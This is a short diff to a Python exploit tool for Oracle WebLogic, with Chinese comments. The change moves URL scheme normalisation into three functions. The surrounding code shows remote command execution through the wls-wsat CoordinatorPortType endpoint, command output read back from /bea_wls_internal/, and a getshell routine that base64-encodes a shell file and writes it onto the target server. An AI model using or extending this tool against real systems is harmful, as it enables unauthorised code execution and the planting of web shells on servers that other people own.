@@ -60,6 +60,8 @@ def payload_command(command_in,output_file):
 得到命令执行的回显结果
 '''
 def get_output(target,output_file):
+    if not target.startswith('http'):
+        target = 'http://{}'.format(target)
     #url增加时间戳避免数据是上一次的结果缓存
     output_url = '{}/bea_wls_internal/{}?{}'.format(target,output_file,int(time.time()))
     try:
@@ -78,6 +80,8 @@ def get_output(target,output_file):
 RCE
 '''
 def weblogic_rce(target,cmd,output_file):
+    if not target.startswith('http'):
+        target = 'http://{}'.format(target)
     url = '{}/wls-wsat/CoordinatorPortType'.format(target)
     #content-type必须为text/xml
     payload_header = {'content-type': 'text/xml','User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
@@ -103,6 +107,8 @@ def weblogic_rce(target,cmd,output_file):
 getshell
 '''
 def weblogic_getshell(target,output_file,shell_file):
+    if not target.startswith('http'):
+        target = 'http://{}'.format(target)
     with open(shell_file) as f:
         cmd = 'echo {}|base64 -d'.format(base64.b64encode(f.read()))
         status,result = weblogic_rce(target,cmd,output_file)
@@ -126,8 +132,6 @@ def main():
     #是否使用proxy
     if not args.proxy:
         proxies = None
-    if not args.target.startswith('http'):
-        args.target = 'http://{}'.format(args.target)
     if args.shell!='':
         status,result = weblogic_getshell(args.target,args.output,args.shell)
     else:
